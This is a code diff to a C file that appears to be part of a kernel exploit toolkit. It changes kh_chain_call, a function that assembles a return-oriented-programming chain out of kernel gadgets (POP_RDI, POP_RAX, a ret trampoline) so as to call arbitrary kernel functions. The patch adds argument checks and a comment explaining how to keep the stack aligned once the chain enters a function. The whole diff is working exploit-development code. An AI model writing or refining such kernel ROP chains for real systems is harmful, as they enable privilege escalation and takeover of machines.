@@ -102,6 +102,12 @@ int kh_chain_memcpy(kh_chain_t *chain, uint64_t dst_kaddr, uint64_t src_kaddr, u
 
 int kh_chain_call(kh_chain_t *chain, uint64_t fn_kaddr, int argc, uint64_t a0, uint64_t a1, uint64_t a2)
 {
+  if (!chain)
+    return -1;
+  if (chain->err || !fn_kaddr || argc < 0 || argc > 3) {
+    chain->err = 1;
+    return -1;
+  }
   if (argc >= 1) {
     kh_chain_g(chain, KERNEL_GADGET_POP_RDI);
     kh_chain_q(chain, a0);
@@ -116,6 +122,11 @@ int kh_chain_call(kh_chain_t *chain, uint64_t fn_kaddr, int argc, uint64_t a0, u
   }
   kh_chain_g(chain, KERNEL_GADGET_POP_RAX);
   kh_chain_q(chain, 0);
+  /* kh_install places the handler at big+0x58, with big 16-byte aligned.
+     When a ret enters a function, its RSP must be 8 mod 16. Argument pairs
+     preserve parity, so add one plain ret when the current length is 0 mod 16. */
+  if ((chain->len & 0xF) == 0)
+    kh_chain_g(chain, KERNEL_GADGET_RET_TRAMP);
   kh_chain_q(chain, fn_kaddr);
   return chain && !chain->err ? 0 : -1;
 }
